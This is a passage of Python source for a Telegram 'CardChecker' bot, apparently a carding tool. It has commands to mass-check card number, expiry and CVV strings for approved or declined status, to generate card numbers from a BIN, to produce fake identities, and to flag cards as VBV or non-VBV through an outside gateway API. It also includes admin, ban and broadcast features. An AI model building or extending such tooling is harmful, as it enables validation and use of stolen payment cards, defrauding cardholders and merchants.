💳 <b>Bin:</b> <code>{bin_code}</code>

[<a href="{channel}">ϟ</a>] <b>Country:</b> <code>{data["country"]}</code>
[<a href="{channel}">ϟ</a>] <b>Issuer:</b> <code>{data["issuer"]}</code>
[<a href="{channel}">ϟ</a>] <b>Scheme:</b> <code>{data["scheme"]}</code>
[<a href="{channel}">ϟ</a>] <b>Tier:</b> <code>{data["tier"]}</code>
[<a href="{channel}">ϟ</a>] <b>Type:</b> <code>{data["type"]}</code>

━━━━━━━━━━━━━━━━
[<a href="{channel}">ϟ</a>] 𝗕𝗶𝗻 𝗟𝗼𝗼𝗸𝘂𝗽 𝗕𝘆 : <a href="tg://user?id={update.effective_user.id}">{update.effective_user.first_name}</a>
[<a href="{channel}">ϟ</a>] 𝗕𝗼𝘁 𝗯𝘆 : <a href="{owner["link"]}">{owner["name"]}</a>
━━━━━━━━━━━━━━━━
''',
parse_mode = "HTML",
disable_web_page_preview=True
        )

    except Exception as error:
        logging.error(f"Bin lookup error , Bin : {bin_code}",exc_info= True)

        await update.message.reply_text(
            text = "❌ <b>Failed to fetch BIN information. Please try again later.</b>", 
            parse_mode="HTML"
            )

async def Queryhandler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global botconfig
    channel = botconfig["mainchannel"]
    owner = botconfig["owner"]
    name = botconfig["botname"]

    query = update.callback_query
    await query.answer()

    if query.data == "tools":
        backbutton = [
            [InlineKeyboardButton("◀ 𝗕𝗮𝗰𝗸", callback_data="back")]
        ]

        await query.edit_message_text(
            text = f'''[<a href='{channel}'>ϟ</a>] <b>𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂</b>

[<a href="{channel}">ϟ</a>] <code>/check</code> - To check a card.
<blockquote><b>Usage: /check 4242424242424242|12|2025|123</b></blockquote>

[<a href="{channel}">ϟ</a>] <code>/fake</code> - To generate fake user data.
<blockquote><b>Usage: /fake in</b></blockquote>

[<a href="{channel}">ϟ</a>] <code>/gen</code> - To generate cards from a BIN.
<blockquote><b>Usage: /gen 424242</b></blockquote>

[<a href="{channel}">ϟ</a>] <code>/bin</code> - To lookup BIN information.
<blockquote><b>Usage: /bin 424242</b></blockquote>

[<a href="{channel}">ϟ</a>] <code>/vbv</code> - To Identify card as VBV or Non-VBV
<blockquote><b>Usage: /vbv 4242424242424242|12|2025|123</b></blockquote>

[<a href="{channel}">ϟ</a>] <code>$ai</code> - ask gemini
<blockquote><b>Usage: $ai what is the capital of france?</b></blockquote>

''',
parse_mode = "HTML",
reply_markup= InlineKeyboardMarkup(backbutton),
disable_web_page_preview=True
        )

    elif query.data == "back":
        startbutton = [
            [InlineKeyboardButton("𝗧𝗼𝗼𝗹𝘀", callback_data="tools"),InlineKeyboardButton("𝗖𝗵𝗮𝗻𝗻𝗲𝗹", url=channel)],
            [InlineKeyboardButton("𝗢𝘄𝗻𝗲𝗿", url = owner["link"]),InlineKeyboardButton("𝗗𝗲𝘃", url = "https://t.me/amitispro")]
        ]

        await query.edit_message_text(
            text = f''' [<a href='{channel}'>ϟ</a>] <b>#𝗖𝗮𝗿𝗱𝗖𝗵𝗲𝗰𝗸𝗲𝗿 | {name}</b> [<a href='{channel}'>ϟ</a>]
- - - - - - - - - - - - - - -

 [<a href='{channel}'>ϟ</a>] <i> To See Command List Please interact with my buttons!. </i>
''',
parse_mode= "HTML",
reply_markup= InlineKeyboardMarkup(startbutton),
disable_web_page_preview=True
    )

async def masscheck(update, context, card_list):
    checking_msg = await update.message.reply_text("💳 <b>Checking your cards...</b>", parse_mode="HTML")

    global botconfig
    owner = botconfig["owner"]
    channel = botconfig["mainchannel"]
    name = botconfig["botname"]

    formatted_results = []
    total = len(card_list)
    declined = 0
    approved = 0
    invalid = 0

    for card in card_list:
        card = card.strip()
        if not card:
            continue

        card_parts = card.split("|")
        if len(card_parts) != 4:
            result_txt = f"<code>{card}</code> - [❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗙𝗼𝗿𝗺𝗮𝘁]"
            invalid += 1
        else:
            result = check_card(card)
            bincode = card[:6]
            cardinfo = get_card_info(bincode)
            countryflag = cardinfo["country_flag"] if cardinfo["country_flag"] != "unknown" else "🚩"
            status = result.get("status", "Unknown")
            if "Approved" in status:
                emoji = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
                approved += 1
            else:
                emoji = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
                declined += 1
            result_txt = f" <code>{card}</code> - [ {emoji} | {countryflag} ]"
        formatted_results.append(result_txt)

    keyboard = [
        [InlineKeyboardButton(text="𝗖𝗵𝗮𝗻𝗻𝗲𝗹", url=channel),
         InlineKeyboardButton(text="𝗢𝘄𝗻𝗲𝗿", url=owner["link"])]
    ]

    checkedcards = "\n".join(formatted_results)
    await checking_msg.edit_text(
        text = f'''#𝗠𝗮𝘀𝘀_𝗖𝗵𝗲𝗰𝗸 | {name}

[<a href='{channel}'>ϟ</a>] 𝗧𝗼𝘁𝗮𝗹 : <i>{total}</i>
[<a href='{channel}'>ϟ</a>] 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 : <i>{approved}</i>
[<a href='{channel}'>ϟ</a>] 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 : <i>{declined}</i>
[<a href='{channel}'>ϟ</a>] 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 : <i>{invalid}</i>

━━━━━━━━━━━━━━━━
{checkedcards}
━━━━━━━━━━━━━━━━
[<a href="{channel}">ϟ</a>] 𝗕𝗼𝘁 𝗯𝘆 : <a href="{owner['link']}">{owner['name']}</a>
[<a href="{channel}">ϟ</a>] 𝗠𝗮𝘀𝘀 𝗰𝗵𝗲𝗰𝗸 𝗯𝘆 : <a href="tg://user?id={update.effective_user.id}">{update.effective_user.first_name}</a>''',
parse_mode = "HTML",
reply_markup = InlineKeyboardMarkup(keyboard),
disable_web_page_preview=True
    )

async def mcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    global botconfig
    group = botconfig["maingroup"]

    conn = sqlite3.connect("checkerdata.db")
    cur = conn.cursor()

    cur.execute("SELECT chatid FROM Groups;")
    grps = cur.fetchall()

    cur.execute("SELECT user_id FROM Users WHERE post IN ('admin', 'owner');")
    admins = cur.fetchall()

    cur.close()
    conn.close()

    adminsid = [admin[0] for admin in admins]
    groupsid = [gp[0] for gp in grps]

    if len(context.args) == 0:
        await update.message.reply_text(
            text = "❌ <b>Please provide card details!</b>\n\nExample: <code>/mcheck 42424346224242424|12|2025|123\n42424242423424242|12|2025|123</code>",
            parse_mode="HTML"
        )
    else:
        if user_id in adminsid:
            asyncio.create_task(masscheck(update, context, context.args))
        else:
            if update.effective_chat.id not in groupsid:
                await update.message.reply_text(
                    text=f"❌ <i>Using this command in private chat or any other group is not allowed. Use the command here</i> 🔽\n\n🔗 <b>{group['link']}</b>\n🔗 <b>{group['link']}</b>\n🔗 <b>{group['link']}</b>\n",
                    parse_mode="HTML",
                    disable_web_page_preview=True
               )
            else:
                conn = sqlite3.connect("checkerdata.db")
                cur = conn.cursor()

                cur.execute("SELECT * FROM Users WHERE user_id = ?;",(update.effective_user.id,))
                user = cur.fetchone()

                cur.close()
                conn.close()

                if user[1] == "banned":
                    await update.message.reply_text(
                        text = "❌ <b>You are banned by the Admins from the bot.</b>",
                        parse_mode= "HTML"
                    )
                else:
                    asyncio.create_task(masscheck(update, context, context.args))

async def visacheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global botconfig
    channel = botconfig["mainchannel"]
    name = botconfig["botname"]
    owner = botconfig["owner"]
    
    if len(context.args) == 0:
        await update.message.reply_text(
            text = "❌ <b>Please provide card details!</b>\n\nExample: <code>/vbv 4242424242424242|12|2025|123</code>",
            parse_mode="HTML"
        )
    else:
        try:
            response = requests.get(f"https://rocky-815m.onrender.com/gateway=bin?key=rockysoon&card={context.args[0]}", timeout=10)

            data = response.json()
        except:
            data = {"response":"API Error ❗"}

        await update.message.reply_text(
            text = f'''#𝗩𝗶𝘀𝗮_𝗖𝗵𝗲𝗰𝗸 | {name}

💳 <b>Card:</b> <code>{context.args[0]}</code>
[<a href="{channel}">ϟ</a>] <b>Visa Check Result:</b> {data["response"]}
━━━━━━━━━━━━━━━━
[<a href="{channel}">ϟ</a>] 𝗕𝗼𝘁 𝗯𝘆 : <a href="{owner['link']}">{owner['name']}</a>
[<a href="{channel}">ϟ</a>] 𝗩𝗶𝘀𝗮 𝗰𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆 : <a href="tg://user?id={update.effective_user.id}">{update.effective_user.first_name}</a>
''',
parse_mode = "HTML",
disable_web_page_preview=True
        )

async def askai(key, chat, update, context):
    thinkingmsg = await update.message.reply_text(
        text = "🤖 <b>GEMINI</b> <i>is thinking . . .</i>",
        parse_mode = "HTML"
    )

    try:
        client = genai.Client(api_key=key)

        response = client.models.generate_content(
            model="gemini-2.5-flash", contents= f"[EXPLAIN IN SHORT]\n{chat}"
            )
        
        thinkingmsg.edit_text(
            text = response.text
        )

    except Exception as error:
        logging.warning(f"Gemini reply error : {error}")

        thinkingmsg.edit_text(
            text = "🤖 <b>GEMINI</b> <i>is sleeping, try again later</i>",
            parse_mode = "HTML"
        )

async def Chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global API_KEY
    text = update.message.text

    if text.startswith("$ai"):
        if API_KEY:
            asyncio.create_task(askai(API_KEY," ".join(text.split()[1:]), update, context))
        else:
            await update.message.reply_text(
                text = "<b>❌ The API key not set up ❌</b>",
                parse_mode = "HTML"
            )

async def admin_commands(update: Update, context : ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    conn = sqlite3.connect("checkerdata.db")
    cur = conn.cursor()

    cur.execute("SELECT * FROM Users WHERE user_id = ?;",(user_id,))
    user = cur.fetchone()

    cur.close()
    conn.close()

    if user[2] in ["owner"]:
        await update.message.reply_text(
            text = '''#𝗢𝘄𝗻𝗲𝗿_𝗠𝗲𝗻𝘂

[<a href="#">ϟ</a>] <code>/addadmin</code> <b>{user_id}</b> - <i>ᴛᴏ ᴍᴀᴋᴇ ᴜsᴇʀ ᴀᴅᴍɪɴ ᴛʜʀᴏᴜɢʜ ɪᴛ's ᴜsᴇʀ-ɪᴅ.</i>
[<a href="#">ϟ</a>] <code>/removeadmin</code> <b>{user_id}</b> - <i>ᴛᴏ ʀᴇᴍᴏᴠᴇ ᴛʜᴇ ᴀᴅᴍɪɴ ᴛʜʀᴏᴜɢʜ ɪᴛ's ᴜsᴇʀ-ɪᴅ.</i>
[<a href="#">ϟ</a>] <code>/addgroup</code> <b>{chat_id link}</b> - <i>ᴛᴏ ᴀᴅᴅ ᴀ ɢʀᴏᴜᴘ ᴛʜʀᴏᴜɢʜ ɪᴛ's ᴄʜᴀᴛ ɪᴅ.</i>
[<a href="#">ϟ</a>] <code>/ban_user</code> {user_id} - <i>ᴛᴏ ʀᴇsᴛʀɪᴄᴛ ᴀ ᴜsᴇʀ ғʀᴏᴍ ᴜsɪɴɢ ᴛʜᴇ ʙᴏᴛ.</i>
[<a href="#">ϟ</a>] <code>/unban_user</code> {user_id} - <i>ᴛᴏ ᴜɴʙᴀɴ ᴀ ʙᴀɴɴᴇᴅ ᴜsᴇʀ ᴜsɪɴɢ ᴛʜʀᴏᴜɢʜ ɪᴛ's ᴜsᴇʀ-ɪᴅ.</i>
[<a href="#">ϟ</a>] <code>/broadcast</code> <b>{text}</b> - <i>ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ ᴀ ᴛᴇxᴛ ᴍsɢ ᴜsɪɴɢ ᴘᴀʀsᴇ ᴍᴏᴅᴇ : ʜᴛᴍʟ.</i>
[<a href="#">ϟ</a>] <code>/forwardall</code> - <i>ʀᴇᴘʟʏ /forwardall ᴛᴏ ғᴏʀᴡᴀʀᴅ ᴛᴏ ᴀʟʟ ᴛʜᴇ ᴜsᴇʀ { sᴜᴘᴘᴏʀᴛs ᴀʟʟ ᴛʏᴘᴇ : ɪᴍɢs, ғɪʟᴇs, ᴛᴇxᴛ }.</i>''',
            parse_mode="HTML",
            disable_web_page_preview= True
        )

    elif user[2] in ["admin"]:
        await update.message.reply_text(
            text = '''#𝗔𝗱𝗺𝗶𝗻_𝗠𝗲𝗻𝘂

[<a href="#">ϟ</a>] <code>/ban_user</code> {user_id} - <i>ᴛᴏ ʀᴇsᴛʀɪᴄᴛ ᴀ ᴜsᴇʀ ғʀᴏᴍ ᴜsɪɴɢ ᴛʜᴇ ʙᴏᴛ.</i>
[<a href="#">ϟ</a>] <code>/unban_user</code> {user_id} - <i>ᴛᴏ ᴜɴʙᴀɴ ᴀ ʙᴀɴɴᴇᴅ ᴜsᴇʀ ᴜsɪɴɢ ᴛʜʀᴏᴜɢʜ ɪᴛ's ᴜsᴇʀ-ɪᴅ.</i>
[<a href="#">ϟ</a>] <code>/broadcast</code> <b>{text}</b> - <i>ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ ᴀ ᴛᴇxᴛ ᴍsɢ ᴜsɪɴɢ ᴘᴀʀsᴇ ᴍᴏᴅᴇ : ʜᴛᴍʟ.</i>
[<a href="#">ϟ</a>] <code>/forwardall</code> - <i>ʀᴇᴘʟʏ /forwardall ᴛᴏ ғᴏʀᴡᴀʀᴅ ᴛᴏ ᴀʟʟ ᴛʜᴇ ᴜsᴇʀ { sᴜᴘᴘᴏʀᴛs ᴀʟʟ ᴛʏᴘᴇ : ɪᴍɢs, ғɪʟᴇs, ᴛᴇxᴛ }.</i>''',
            parse_mode="HTML",
            disable_web_page_preview= True
        )
    else:
        await update.message.reply_text(
            text = "❌ <b>Only Admins / Owner of the bot can use this command.</b>",
            parse_mode= "HTML"
        )

async def addadmin(update: Update, context : ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    conn = sqlite3.connect("checkerdata.db")
    cur = conn.cursor()

    cur.execute("SELECT * FROM Users WHERE user_id = ?;",(user_id,))
    user = cur.fetchall()

    cur.close()
    conn.close()

    if user[0][2] == "owner":
        args = context.args

        if len(args) == 0:
            await update.message.reply_text(
                text = "❌ <b>No user-id given</b>",
                parse_mode = "HTML"
            )
        else:
            if int(args[0]) == user_id:
                await update.message.reply_text(
                    text = "❌ <b>You can not promote yourself</b>",
                    parse_mode = "HTML"
                )
            else:
                conn = sqlite3.connect("checkerdata.db")
                cur = conn.cursor()
    
                cur.execute("SELECT * FROM Users WHERE user_id = ?;",(int(args[0]),))
                adminft = cur.fetchone()
    
                cur.close()
                conn.close()

                if adminft:
                    if adminft[2] == "admin":
                        await update.message.reply_text(
                            text = f"🆔 : <code>{args[0]}</code>\n\n<b>User is already admin</b>",
                            parse_mode= "HTML"
                        )
                    else:
                        bot = context.bot
                        
                        try:
                            await bot.send_message(
                                chat_id= int(context.args[0]),
                                text = "🔔 <b>You are promoted to admin by the Owner.</b>",
                                parse_mode= "HTML"
                            )
                        except:
                            logging.warning(f"Can't send notification to User {context.args[0]} ( while adding admin )",exc_info= True)
            
                        conn = sqlite3.connect("checkerdata.db")
                        cur = conn.cursor()
        
                        cur.execute("UPDATE Users SET post = ? WHERE user_id = ?;",("admin",int(context.args[0])))
        
                        conn.commit()
                        cur.close()
                        conn.close()
        
                        await update.message.reply_text(
                            text = f"👤 <b>User</b> : <code>{context.args[0]}</code>\n\n✅ <i>successfully promoted to admin</i>",
                            parse_mode = "HTML"
                        )
                else:
                    await update.message.reply_text(
                        text = f"🆔 : <code>{context.args[0]}</code>\n\n❌ <b>ID Not found in database! Tell him to start the bot once, then try again</b>",
                        parse_mode = "HTML"
                    )
    else:
        await update.message.reply_text(
            text = "❌ <b>Only Owner of the bot can use this command.</b>",
            parse_mode= "HTML"
        )

async def removeadmin(update: Update, context : ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    conn = sqlite3.connect("checkerdata.db")
    cur = conn.cursor()

    cur.execute("SELECT * FROM Users WHERE user_id = ?;",(user_id,))
    user = cur.fetchall()

    cur.close()
    conn.close()

    if user[0][2] == "owner":
        args = context.args

        if len(args) == 0:
            await update.message.reply_text(
                text = "❌ <b>No user-id given</b>",
                parse_mode = "HTML"
            )
        else:
            if int(args[0]) == user_id:
                await update.message.reply_text(
                    text = "❌ <b>You can not depromote yourself</b>",
                    parse_mode = "HTML"
                )
            else:
                conn = sqlite3.connect("checkerdata.db")
                cur = conn.cursor()

                cur.execute("SELECT * FROM Users WHERE user_id = ?;",(int(args[0]),))
                adminft = cur.fetchone()

                cur.close()
                conn.close()

                if adminft:
                    if adminft[2] == "user":
                        await update.message.reply_text(
                            text = f"🆔 : <code>{args[0]}</code>\n\n<b>User is already Not admin</b>",
                            parse_mode= "HTML"
                        )
                    else:
                        bot = context.bot
                        
                        try:
                            await bot.send_message(
                                chat_id= int(context.args[0]),
                                text = "🔕 <b>You are not an admin anymore. Removed by the Owner</b>",
                                parse_mode= "HTML"
                            )
                        except:
                            logging.warning(f"Can't send notification to User {context.args[0]} ( while removing admin )",exc_info= True)
            
                        conn = sqlite3.connect("checkerdata.db")
                        cur = conn.cursor()
        
                        cur.execute("UPDATE Users SET post = ? WHERE user_id = ?;",("user",int(context.args[0])))
        
                        conn.commit()
                        cur.close()
                        conn.close()
        
                        await update.message.reply_text(
                            text = f"👤 <b>User</b> : <code>{context.args[0]}</code>\n\n✅ <i>successfully removed from admin</i>",
                            parse_mode = "HTML"
                        )
                else:
                    await update.message.reply_text(
                        text = f"🆔 : <code>{context.args[0]}</code>\n\n❌ <b>ID Not found in database! Tell him to start the bot once, then try again</b>",
                        parse_mode = "HTML"
                    )

    else:
        await update.message.reply_text(
            text = "❌ <b>Only Owner of the bot can use this command.</b>",
            parse_mode= "HTML"
        )

async def broadcasting_task(update, context, text):
    user_id = update.effective_user.id

    conn = sqlite3.connect("checkerdata.db")
    cur = conn.cursor()
    cur.execute("SELECT user_id FROM Users;")
    users = cur.fetchall()
    cur.close()
    conn.close()

    status_message = await update.message.reply_text(
        text = "🚀 𝙱𝚛𝚘𝚊𝚍𝚌𝚊𝚜𝚝𝚒𝚗𝚐 . . ."
        )
    logging.warning(f"Broadcast started by the admin {user_id}")

    bot = context.bot

    for user in users:
        try:
            if user_id != user[0]:
                await bot.send_message(
                    chat_id = user[0],
                    text = text,
                    parse_mode = 'HTML'
                    )
                # print(f"Message sent : {user[0]}")
        except Exception as e:
            logging.warning(f"Broadcast msg can't sent to: {user[0]} : {e}")

    await status_message.edit_text(
        text = "✅ 𝙱𝚛𝚘𝚊𝚍𝚌𝚊𝚜𝚝𝚒𝚗𝚐 𝙳𝚘𝚗𝚎"
        )
    logging.info(f"Broadcasting task over by the admin {user_id}")
    
async def broadcast(update : Update, context : ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    conn = sqlite3.connect("checkerdata.db")
    cur = conn.cursor()

    cur.execute("SELECT * FROM Users WHERE user_id = ?;",(user_id,))
    user = cur.fetchone()

    cur.close()
    conn.close()

    if user[2] in ["admin","owner"]:
        if len(context.args) == 0:
            await update.message.reply_text(
                text = "❌ <b>No msg given</b>",
                parse_mode = "HTML"
            )

        else:
            text = " ".join(context.args)
    
            asyncio.create_task(broadcasting_task(update, context, text))
    else:
        await update.message.reply_text(
            text = "❌ <b>Only Owner / Admins of the bot can use this command.</b>",
            parse_mode = "HTML"
        )

async def ban_user(update : Update, context : ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    conn = sqlite3.connect("checkerdata.db")
    cur = conn.cursor()

    cur.execute("SELECT * FROM Users WHERE user_id = ?;",(user_id,))
    user = cur.fetchone()

    cur.close()
    conn.close()

    if user[2] in ["admin","owner"]:
        if len(context.args) == 0:
            await update.message.reply_text(
                text = "❌ <b>No user-id given</b>"
            )
        else:
            conn = sqlite3.connect("checkerdata.db")
            cur = conn.cursor()

            cur.execute("SELECT * FROM Users WHERE user_id = ?;",(int(context.args[0]),))
            botuser = cur.fetchone()

            cur.close()
            conn.close()

            if botuser:
                if botuser[2] == "owner":
                    await update.message.reply_text(
                        text = f"🆔 : <code>{botuser[0]}</code>\n\n<b>Oh please, I can't ban Owner</b>.",
                        parse_mode= "HTML"
                    )
                elif botuser[2] == "admin":
                    await update.message.reply_text(
                        text = f"🆔 : <code>{botuser[0]}</code>\n\n<b>Oh please, I can't ban an Admin</b>.",
                        parse_mode = "HTML"
                    )
                else:
                    bot = context.bot
                    try:
                        await bot.send_message(
                            chat_id= int(context.args[0]),
                            text = "🔕 <b>You are banned from the bot by the Admin</b>",
                            parse_mode = "HTML"
                        )
                    except:
                        logging.warning(f"Can't send notification to User {context.args[0]} ( while Banning user )",exc_info= True)
    
                    conn = sqlite3.connect("checkerdata.db")
                    cur = conn.cursor()
        
                    cur.execute("UPDATE Users SET state = ? WHERE user_id = ?;",("banned",int(context.args[0])))
                    conn.commit()
        
                    cur.close()
                    conn.close()
    
                    await update.message.reply_text(
                        text = f"👤 <b>User</b> : <code>{context.args[0]}</code>\n\n✅ <i>Successfully Banned</i>",
                        parse_mode= "HTML"
                    )
            else:
                await update.message.reply_text(
                    text = f"🆔 : <code>{context.args[0]}</code>\n\n<b>ID not found in db <i>( User haven't used the bot )</i></b>"
                )
    else:
        await update.message.reply_text(
            text = "❌ <b>Only Owner / Admins of the bot can use this command.</b>",
            parse_mode = "HTML"
        )

async def unban_user(update : Update, context : ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    conn = sqlite3.connect("checkerdata.db")
    cur = conn.cursor()

    cur.execute("SELECT * FROM Users WHERE user_id = ?;",(user_id,))
    user = cur.fetchone()

    cur.close()
    conn.close()

    if user[2] in ["admin","owner"]:
        if len(context.args) == 0:
            await update.message.reply_text(
                text = "❌ <b>No user-id given</b>"
            )
        else:
            conn = sqlite3.connect("checkerdata.db")
            cur = conn.cursor()

            cur.execute("SELECT * FROM Users WHERE user_id = ?;",(int(context.args[0]),))
            botuser = cur.fetchone()

            cur.close()
            conn.close()

            if botuser:
                if botuser[1] == "banned":
                    bot = context.bot
                    try:
                        await bot.send_message(
                            chat_id= int(context.args[0]),
                            text = "🔔 <b>You are Unbanned from the bot by the Admin</b>",
                            parse_mode = "HTML"
                        )
                    except:
                        logging.warning(f"Can't send notification to User {context.args[0]} ( while UnBanning user )",exc_info= True)
    
                    conn = sqlite3.connect("checkerdata.db")
                    cur = conn.cursor()
        
                    cur.execute("UPDATE Users SET state = ? WHERE user_id = ?;",("unbanned",int(context.args[0])))
                    conn.commit()
        
                    cur.close()
                    conn.close()
    
                    await update.message.reply_text(
                        text = f"👤 <b>User</b> : <code>{context.args[0]}</code>\n\n✅ <i>Successfully UnBanned</i>",
                        parse_mode= "HTML"
                    )
                else:
                    await update.message.reply_text(
                        text = f"🆔 : <code>{botuser[0]}</code>\n\n<b>The user is not banned</b>",
                        parse_mode= "HTML"
                    )
            else:
                await update.message.reply_text(
                    text = f"🆔 : <code>{context.args[0]}</code>\n\n<b>ID not found in db <i>( User haven't used the bot )</i></b>",
                    parse_mode= "HTML"
                )

    else:
        await update.message.reply_text(
            text = "❌ <b>Only Owner / Admins of the bot can use this command.</b>",
            parse_mode = "HTML"
        )

async def broadcasting_task2(update, context, msg, admin, adminid):

    conn = sqlite3.connect("checkerdata.db")
    cur = conn.cursor()
    cur.execute("SELECT user_id FROM Users;")
    users = cur.fetchall()
    cur.close()
    conn.close()

    status_message = await update.message.reply_text(
        text = "🚀 𝙱𝚛𝚘𝚊𝚍𝚌𝚊𝚜𝚝𝚒𝚗𝚐 . . ."
        )
    
    logging.warning(f"Forwarding task started by admin {adminid}")
    
    bot = context.bot

    for user in users:
        try:
            if adminid != user[0]:
                await bot.forward_message(
                    chat_id = user[0],
                    from_chat_id = admin,
                    message_id = msg
                )

                # print(f"Message sent : {user[0]}")
        except Exception as e:
            logging.warning(f"Forwarded msg can't sent to: {user[0]} : {e}")

    await status_message.edit_text(
        text = "✅ 𝙱𝚛𝚘𝚊𝚍𝚌𝚊𝚜𝚝𝚒𝚗𝚐 𝙳𝚘𝚗𝚎"
        )

async def forwardall(update : Update, context : ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    conn = sqlite3.connect("checkerdata.db")
    cur = conn.cursor() 

    cur.execute("SELECT * FROM Users WHERE user_id = ?;",(user_id,))
    user = cur.fetchone()

    cur.close()
    conn.close()

    if user[2] in ["admin","owner"]:
        if update.message.reply_to_message:
            msgid = update.message.reply_to_message.message_id
            fromchatid = update.message.reply_to_message.chat.id

            asyncio.create_task(broadcasting_task2(update, context, msgid, fromchatid, user_id))
        else:
            await update.message.reply_text(
                text = "<code>/forwardall</code> - Reply a message with /forwardall to broadcast it.",
                parse_mode = "HTML"
            )
    else:
        await update.message.reply_text('❌ <b>Only Owner / Admins of the bot can use this command.</b>',parse_mode = 'HTML')

async def addgroup(update: Update, context : ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    conn = sqlite3.connect("checkerdata.db")
    cur = conn.cursor()

    cur.execute("SELECT * FROM Users WHERE user_id = ?;",(user_id,))
    user = cur.fetchone()

    cur.close()
    conn.close()

    if user[2] == "owner":
        if len(context.args) == 0:
            await update.message.reply_text(
                text = "<code>/addgroup {chat-id} {link}</code> - to add group",
                parse_mode= "HTML"
            )
        else:
            if len(context.args) == 2:
                try:
                    id = int(context.args[0])
                    link = context.args[1]

                    conn = sqlite3.connect("checkerdata.db")
                    cur = conn.cursor()

                    cur.execute("INSERT INTO Groups (chatid, link) VALUES (?,?);",(id,link))
                    conn.commit()

                    cur.close()
                    conn.close()

                    await update.message.reply_text(
                        text = f"✅ <b>Group added Successfully</b>\n\n🆔 : <code>{id}</code>\n🔗 : <b>{link}</b>",
                        parse_mode= "HTML",
                        disable_web_page_preview= True
                    )
                except:
                    await update.message.reply_text(
                        text = "❌ <b>Invalid Format</b>\n\nEx: <code>/addgroup {chat-id} {link}</code>",
                        parse_mode = "HTML"
                    )
            else:
                await update.message.reply_text(
                    text = "❌ <b>Invalid Format</b>\n\nEx: <code>/addgroup {chat-id} {link}</code>",
                    parse_mode = "HTML"
                )
    else:
        await update.message.reply_text(
            text = "❌ <b>Only Owner of the bot can use this command.</b>",
            parse_mode = "HTML"
        )

async def removegroup(update: Update, context : ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    conn = sqlite3.connect("checkerdata.db")
    cur = conn.cursor()
    cur.execute("SELECT * FROM Users WHERE user_id = ?;",(user_id,))
    user = cur.fetchone()
    cur.close()
    conn.close()

    if user[2] == "owner":
        if len(context.args) == 0:
            await update.message.reply_text(
                text = "<code>/removegroup {chat-id}</code> - to remove group",
                parse_mode= "HTML"
            )
        else:
            if len(context.args) == 1:
                try:
                    id = int(context.args[0])
                    conn = sqlite3.connect("checkerdata.db")
                    cur = conn.cursor()
                    cur.execute("SELECT * FROM Groups WHERE chatid = ?;",(id,))
                    groupdata = cur.fetchall()
                    cur.execute("DELETE FROM Groups WHERE chatid = ?;",(id,))
                    conn.commit()
                    cur.close()
                    conn.close()

                    if len(groupdata) == 0:
                        await update.message.reply_text(
                            text = "❌ <b>No such group find in database</b>",
                            parse_mode = "HTML"
                        )
                    else:
                        await update.message.reply_text(
                            text = f"✅ <b>Group removed Successfully</b>\n\n🆔 : <code>{id}</code>\n🔗 : <b>{groupdata[0][1]}</b>",
                            parse_mode= "HTML",
                            disable_web_page_preview= True
                        )
                except:
                    await update.message.reply_text(
                        text = "❌ <b>Invalid Format</b>\n\nEx: <code>/removegroup {chat-id}</code>",
                        parse_mode = "HTML"
                    )
            else:
                await update.message.reply_text(
                    text = "❌ <b>Invalid Format</b>\n\nEx: <code>/removegroup {chat-id}</code>",
                    parse_mode = "HTML"
                )
    else:
        await update.message.reply_text(
            text = "❌ <b>Only Owner of the bot can use this command.</b>",
            parse_mode = "HTML"
        )

if __name__  == "__main__":
    """Start the bot."""

    application = Application.builder().token(TOKEN).build()
    application.add_error_handler(error_handler)

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("check", check))
    application.add_handler(CommandHandler("fake", fake))
    application.add_handler(CommandHandler("gen", gen))
    application.add_handler(CommandHandler("bin", bin))
    application.add_handler(CommandHandler("mcheck",mcheck))
    application.add_handler(CommandHandler("vbv",visacheck_command))
    application.add_handler(CommandHandler("admincmds",admin_commands))
    application.add_handler(CommandHandler("addadmin",addadmin))
    application.add_handler(CommandHandler("removeadmin",removeadmin))
    application.add_handler(CommandHandler("broadcast",broadcast))
    application.add_handler(CommandHandler("ban_user",ban_user))
    application.add_handler(CommandHandler("unban_user",unban_user))
    application.add_handler(CommandHandler("forwardall",forwardall))
    application.add_handler(CommandHandler("addgroup",addgroup))
    application.add_handler(CommandHandler("removegroup",removegroup))
    application.add_handler(CallbackQueryHandler(Queryhandler, pattern = "^(tools|back)$"))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, Chat))
    
    logging.warning("Bot started successfully")
    print("[Check logs.txt for Bot activities] Bot is running...")
    application.run_polling()